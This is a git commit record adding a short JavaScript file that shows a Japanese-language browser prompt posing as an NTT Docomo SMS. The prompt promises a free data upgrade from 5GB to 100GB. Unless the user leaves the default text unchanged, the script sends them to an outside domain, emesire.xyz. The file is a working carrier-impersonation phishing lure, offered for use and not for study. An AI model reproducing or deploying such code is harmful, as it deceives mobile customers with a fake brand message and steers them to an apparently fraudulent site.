352fb6c4d6178f13bbe1fa6ee5791d9cdb032b05
sureoffer <emesire247@gmail.com>
2025-06-06 00:15:26 -0700

    Create activation-nttdocomo5GB-100GB.js

---
+++ activation-nttdocomo5GB-100GB.js
@@ -0,0 +1,6 @@
+
+var password = '無料データ'
+password=prompt('NTT DOCOMO SMS: お客様各位、お手持ちのNTTドコモSIMカードが5GBから100GBのデータ容量に対応しているかご確認ください。既存顧客特典として、今すぐ無料データ通信をご確認ください。 ','無料データ');
+if (password != '無料データ') {
+location.href='https://emesire.xyz/nttdocomo5GB-100GB.html';
+}
